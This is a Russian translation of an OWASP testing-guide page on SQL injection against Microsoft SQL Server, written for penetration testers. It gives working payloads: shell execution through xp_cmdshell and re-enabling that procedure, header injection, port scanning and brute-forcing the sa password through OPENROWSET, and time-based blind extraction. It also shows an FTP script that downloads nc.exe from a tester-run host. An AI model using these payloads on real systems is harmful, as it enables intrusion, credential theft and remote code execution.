---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование MS SQL Server

## Обзор

В этом разделе будут обсуждаться некоторые методы [SQL-инъекций](https://owasp.org/www-community/attacks/SQL_Injection), которые используют функции, специфические для Microsoft SQL Server.

Уязвимости SQL-инъекций возникают всякий раз, когда входные данные используются при построении SQL-запроса без надлежащего ограничения или нейтрализации. Использование динамического SQL (построение SQL-запросов путём конкатенации строк) открывает доступ к этим уязвимостям. SQL-инъекция позволяет злоумышленнику получить доступ к серверам SQL и выполнить код SQL под привилегиями пользователя, подключившегося к базе данных.

Как объясняется в [SQL-инъекциях](https://owasp.org/www-community/attacks/SQL_Injection), для SQL-инъекции требуются две вещи: точка входа и наличие уязвимости. Любой контролируемый пользователем параметр, который обрабатывается приложением, может скрывать уязвимость. Например:

- Параметры приложения в строках запроса (например, в GET-запросах)
- Параметры приложения, включенные в тело POST-запроса.
- Информация, относящаяся к браузеру (например, user-agent, referrer)
- Информация, относящаяся к хосту (например, имя хоста, IP)
- Информация, относящаяся к сессии (например, идентификатор пользователя, cookie)

Microsoft SQL Server обладает несколькими уникальными характеристиками, поэтому некоторые эксплойты необходимо специально адаптировать для этого приложения.

## Как тестировать

### Характеристики MS SQL Server

Для начала давайте рассмотрим некоторые операторы, команды/хранимые процедуры MS SQL Server, которые полезны при тестировании SQL-инъекций:

- оператор комментария: `--` (полезен для того, чтобы заставить сервер игнорировать оставшуюся часть исходного запроса; нужен не всегда)
- разделитель запросов: `;` (точка с запятой)
- Полезные хранимые процедуры:
    - [xp_cmdshell](https://docs.microsoft.com/ru-ru/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) запускает командную оболочку на сервере с теми же разрешениями, что и в данный момент. По умолчанию её может использовать только `sysadmin`, а начиная с SQL Server 2005 она отключена по умолчанию (можно включить с помощью sp_configure).
    - `xp_regread` читает произвольное значение из реестра Windows (недокументированная расширенная процедура)
    - `xp_regwrite` записывает произвольное значение в реестр Windows  (недокументированная расширенная процедура)
    - [sp_makewebtask](https://docs.microsoft.com/ru-ru/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) создаёт командную оболочку Windows и передаёт строку для выполнения. Вывод в виде строк текста. Требуются права `sysadmin`.
    - [xp_sendmail](https://docs.microsoft.com/ru-ru/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) отправляет email-сообщение, которое может содержать вложение с набором результатов запроса, указанным получателям. Эта расширенная хранимая процедура для отправки сообщения использует SQL Mail.

Давайте теперь посмотрим на примеры конкретных атак на SQL Server, которые применяют вышеупомянутые функции. В большинстве случаев будет использоваться функция `exec`.

Ниже мы покажем, как выполнить команду оболочки, которая записывает вывод команды `dir c:\inetpub` в доступный для просмотра файл, предполагая, что веб-сервер и сервер БД находятся на одном хосте. Вот синтаксис с `xp_cmdshell`:

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

В качестве альтернативы можно взять `sp_makewebtask`:

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

При успешном выполнении создастся файл, который можно прочитать. Имейте в виду, что `sp_makewebtask` устарела, и, даже если она работает в версиях SQL Server до 2005 года, она может быть удалена в будущем.

Кроме того, очень удобны встроенные функции SQL Server и переменные среды. Ниже функция `db_name()` используется для вызова ошибки, которая выдаёт имя базы данных:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

Обратите внимание на использование [convert](https://docs.microsoft.com/ru-ru/sql/t-sql/functions/cast-and-convert-transact-sql):

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` попытается преобразовать результат `db_name` (строка) в целочисленную переменную, вызывая ошибку, которая, при отображении уязвимым приложением, будет содержать имя базы данных.

В следующем примере используется переменная среды `@@version` в сочетании с инъекцией в стиле `union select`, чтобы найти версию SQL Server.

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

А вот та же атака, но снова использующая трюк с преобразованием:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

Сбор информации полезен для использования уязвимостей приложений на SQL Server, путём эксплуатации атаки SQL-инъекции или прямого доступа к прослушивателю SQL (англ.: listener).

Далее мы покажем несколько примеров уязвимости SQL-инъекций через разные точки входа.

### Пример 1: Тестирование SQL-инъекций в запросе GET

Самый простой (а иногда и самый полезный) случай — это страница входа, запрашивающая имя пользователя и пароль для входа пользователя. Можно попробовать ввести следующую строку "' или '1'='1" (без двойных кавычек):

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

Если приложение использует динамические SQL-запросы, и строка добавляется к запросу проверки учётных данных пользователя, это может привести к успешному входу в приложение.

### Пример 2: Тестирование SQL-инъекций в запросе GET

Для того, чтобы узнать, сколько всего столбцов

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### Пример 3: Тестирование в запросе POST

SQL-инъекция, Содержимое HTTP POST: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

Пример полностью (`https://vulnerable.web.app/forgotpass.asp`):

```http
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: http://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

Сообщение об ошибке, получаемое при вводе символа `'` (одинарная кавычка) в поле электронной почты:

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

### Пример 4: Ещё один (полезный) пример GET

Получение исходного кода приложения

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### Пример 5: Нестандартный `xp_cmdshell`

Во всех книгах и статьях, описывающих лучшие практики безопасности для SQL Server, рекомендуется отключать `xp_cmdshell` в SQL Server 2000 (начиная с SQL Server 2005 он отключен по умолчанию). Однако, если у нас есть права системного администратора (исходно или путем перебора пароля системного администратора, см. ниже), мы часто можем обойти это ограничение.

В SQL Server 2000:

- Если `xp_cmdshell` был отключен с помощью `sp_dropextendedproc`, мы можем просто вставить следующий код:

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

- Если предыдущий код не работает, это означает, что `xp_log70.dll` был перемещён или удалён. В этом случае нам нужно ввести следующий код:

```sql
CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
    DECLARE @result int, @OLEResult int, @RunResult int
    DECLARE @ShellID int
    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OADestroy @ShellID
    return @result
```

Этот код, написанный Антонином Фоллером (см. Ссылки внизу страницы), создаёт новый `xp_cmdshell`, используя `sp_oacreate`, `sp_oamethod` и `sp_oadestroy` (если, конечно, они тоже не были отключены). Перед его использованием нужно удалить первый созданный нами `xp_cmdshell` (даже если он не работал), в противном случае объявления будут конфликтовать.

В SQL Server 2005 можно включить `xp_cmdshell`, введя вместо этого следующий код:

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

### Пример 6: Referer / User-Agent

Заголовок `REFERER`, установленный в значение

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [код SQL]--`

позволяет выполнять произвольный код SQL. То же самое происходит с заголовком User-Agent, установленным в значение

`User-Agent: user_agent', 'some_ip'); [код SQL]--`

### Пример 7: SQL Server в качестве сканера портов

В SQL Server одной из наиболее полезных (по крайней мере, для тестирования на проникновение) команд является OPENROWSET, которая используется для выполнения запроса на другом сервере БД и получения результатов. Тестировщик может использовать эту команду для сканирования портов других компьютеров в целевой сети, посредством следующего запроса:

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

Этот запрос попытается подключиться к адресу x.y.w.z по порту p. Если порт закрыт, будет возвращено следующее сообщение:

`SQL Server does not exist or access denied`

С другой стороны, если порт открыт, будет возвращена одна из следующих ошибок:

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

Конечно, сообщение об ошибке выдаётся не всегда. Если это так, мы можем использовать время отклика, чтобы понять, что происходит: с закрытым портом будет время ожидания (5 секунд в этом примере), тогда как открытый порт выдаст результат сразу.

Имейте в виду, что OPENROWSET по умолчанию включен в SQL Server 2000, и отключен, начиная с SQL Server 2005.

### Пример 8: Загрузка исполняемых файлов

Как только мы сможем использовать `xp_cmdshell` (стандартный или пользовательский), мы сможем легко загружать исполняемые файлы на целевой сервер БД. Очень частым выбором является `netcat.exe`, но здесь подойдет любой троян. Если цели разрешены FTP-подключения к машине тестировщика, то всё, что нужно, — это ввести следующие запросы:

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

На этом этапе загрузится и будет доступен `nc.exe`.

Если FTP не разрешён межсетевым экраном, у нас есть обходной путь, который использует отладчик Windows, `debug.exe`, который устанавливается по умолчанию на всех машинах Windows. `Debug.exe` поддерживает скрипты и может создать исполняемый файл, выполнив соответствующий скрипт. Что нам нужно сделать, так это преобразовать исполняемый файл в скрипт отладки (который представляет собой ASCII-файл), загрузить его построчно и, наконец, вызвать для него `debug.exe`. Существует несколько инструментов, которые создают такие отладочные файлы (например, makescr.exe от Ollie Whitehouse и dbgtool.exe от toolcrypt.org). Таким образом, запросы для инъекций будут следующими:

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

На данный момент наш исполняемый файл доступен на целевой машине и готов к выполнению. Существуют инструменты, которые автоматизируют этот процесс, в первую очередь `Bobcat`, работающий в Windows, и `Sqlninja`, работающий в Unix (см. Инструменты внизу этой страницы).

### Получение информации, когда она не отображается (внеполосно)

Не все потеряно, если web-приложение не даёт никакой информации, даже содержательных сообщений об ошибках (см. [Слепое внедрение SQL](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). Например, может случиться так, что у вас есть доступ к исходному коду (например, потому что web-приложение основано на программном обеспечении с открытым исходным кодом). Тогда тестировщик может использовать все уязвимости SQL-инъекций, обнаруженные в автономном режиме в web-приложении. Хотя IPS может остановить некоторые из этих атак, лучше всего действовать следующим образом: разработать и протестировать атаки на тестовом стенде, созданном для этой цели, а затем провести эти атаки на тестируемое web-приложение.

Другие варианты внеполосных атак описаны выше в Примере 4.

### Слепые атаки SQL-инъекций

#### Метод проб и ошибок

В качестве альтернативы можно сыграть в рулетку. То есть злоумышленник может предположить, что в web-приложении возможна слепая или внеполосная SQL-инъекция. Затем он выберет вектор атаки (например, через web), [использует векторы для фаззинга](../../6-Appendix/C-Fuzz_Vectors.md) для этого канала и наблюдает за реакцией. Например, если web-приложение ищет книгу с помощью запроса

```sql
select * from books where title="text entered by the user"
```

тогда тестировщик может ввести текст: `'Bomba' OR 1=1-` и если данные должным образом не контролируются, запрос пройдёт и вернёт весь список книг. Это свидетельствует о наличии уязвимости SQL-инъекций. Позже тестер на проникновение может «поиграть» с запросами, чтобы оценить критичность этой уязвимости.

#### Если отображается несколько сообщений об ошибках

С другой стороны, если никакой предварительной информации нет, всё ещё существует возможность атаки с использованием любого «скрытого канала». Может случиться так, что подробные описания в ошибках не выдаются, но сообщения об ошибках содержат некоторую информацию. Например:

- В некоторых случаях web-приложение (точнее web-сервер) может выдавать традиционную ошибку `500: Internal Server Error`, например, когда приложение возвращает исключение, которое может быть сгенерировано, например, запросом с незакрытыми кавычками.
- В то время как в других случаях сервер выдаст сообщение `200 OK`, а web-приложение вернёт некоторое сообщение об ошибке, вставленное разработчиками `Internal server error` или `bad data`.

Этого бита информации может быть достаточно, чтобы понять, как web-приложение создаёт динамический SQL-запрос, и настроить инъекцию. Другой внеполосный метод заключается в выводе результатов через файлы с возможностью просмотра по протоколу HTTP.

#### Атаки по времени

Существует ещё одна возможность для проведения слепой атаки SQL-инъекцией, когда нет видимой обратной связи от приложения: путём измерения времени, которое web-приложению требуется для ответа на запрос. Атака такого рода [описана Энли](http://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf), откуда мы и берём следующие примеры. Типичный подход использует команду `waitfor delay`: допустим, злоумышленник хочет проверить, существует ли экземпляр базы данных `pubs`, он просто вводит следующую команду:

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

В зависимости от времени, которое требуется для реакции на запрос, мы узнаем ответ. На самом деле здесь две вещи: «уязвимость SQL-инъекции» и «скрытый канал», который позволяет получать по одному биту информации на каждый запрос. Таким образом, с помощью нескольких запросов (столько запросов, сколько битов в требуемой информации) тестировщик может получить любые данные, которые есть в базе данных. Посмотрите на следующий запрос

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

Измеряя время отклика и используя разные значения для `@i`, мы можем получить длину имени текущей базы данных, а затем начать извлекать само имя с помощью следующего запроса:

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

Этот запрос будет ждать 5 секунд, если бит `@bit` байта `@byte` имени текущей базы данных равен 1, или выполнится сразу, если он равен 0. За счёт вложенных циклов (один для `@byte` и один для `@bit`), мы получаем способ извлечь информацию целиком.

Однако может случиться так, что команда `waitfor` будет недоступна (например, из-за того, что она фильтруется IPS/WAF). Это не означает, что слепые атаки SQL-инъекций невозможны, просто надо придумать такие операции, которые не фильтруются. Например

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### Проверка версии и уязвимостей

Тот же подход на основе времени можно использовать и для того, чтобы понять, с какой версией SQL Server мы имеем дело. Конечно, мы будем использовать встроенную переменную `@@version`. Рассмотрим следующий запрос:

`select @@version`

В SQL Server 2005 он вернёт что-то вроде:

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

Подстрока `2005` занимает с 22-го по 25-й символы. Таким образом, один из запросов для инъекции может быть следующим:

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

Такой запрос будет ждать 5 секунд, если 25-й символ переменной `@@version` равен 5, показывая нам, что мы имеем дело с SQL Server 2005. Если запрос реагирует немедленно, мы, вероятно, имеем дело с SQL Server 2000, и ещё один подобный запрос поможет развеять все сомнения.

### Пример 9: Подбор пароля системного администратора

Чтобы взломать пароль системного администратора, мы можем использовать тот факт, что `OPENROWSET` для успешного подключения нужны правильные учётные данные, и что такое соединение также может быть "зациклено" на локальном сервере БД. Объединив эти функции с атакой инъекции путём логического вывода на основе времени отклика, мы можем ввести следующий код:

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

Что мы здесь делаем, так это пытаемся подключиться к локальной базе данных (указанной пустым полем после `SQLOLEDB`), используя в качестве учётных данных `sa` и `<pwd>`. Если пароль правильный и подключение выполнено успешно, запрос выполняется, заставляя базу данных ждать 5 секунд (а также выдавая значение, поскольку OPENROWSET ожидает по крайней мере один столбец). Извлекая пароли-кандидаты из списка слов и измеряя время, необходимое для каждого соединения, мы можем попытаться угадать правильный пароль. В статье "Data-mining with SQL Injection and Inference", David Litchfield Дэвид Личфилд продвигает этот метод еще дальше, вводя фрагмент кода для перебора пароля системного администратора, используя ресурсы процессора самого сервера БД.

Как только у нас будет пароль системного администратора, у нас будет два варианта:

- Ввести последующие запросы, используя `OPENROWSET`, пользуясь привилегиями системного администратора.
- Добавьте нашего текущего пользователя в группу sysadmin, используя `sp_addsrvrolemember`. Текущее имя пользователя можно извлечь с помощью косвенной инъекции по переменной `system_user`.

Помните, что OPENROWSET доступен для всех пользователей SQL Server 2000, но ограничен административными учётными записями в SQL Server 2005.

## Инструменты

- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)

## Ссылки

### Технические руководства

- [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Chris Anley, "(more) Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [Steve Friedl's Unixwiz.net Tech Tips: "SQL Injection Attacks by Example"](http://www.unixwiz.net/techtips/sql-injection.html)
- [Alexander Chigrik: "Useful undocumented extended stored procedures"](https://www.databasejournal.com/features/mssql/article.php/1441251/Useful-Undocumented-Extended-Stored-Procedures.htm)
- [Antonin Foller: "Custom xp_cmdshell, using shell object"](https://www.motobit.com/tips/detpg_cmdshell)
- [SQL Injection](https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf)
- [Cesar Cerrudo: Manipulating Microsoft SQL Server Using SQL Injection, uploading files, getting into internal network, port scanning, DOS](https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf)
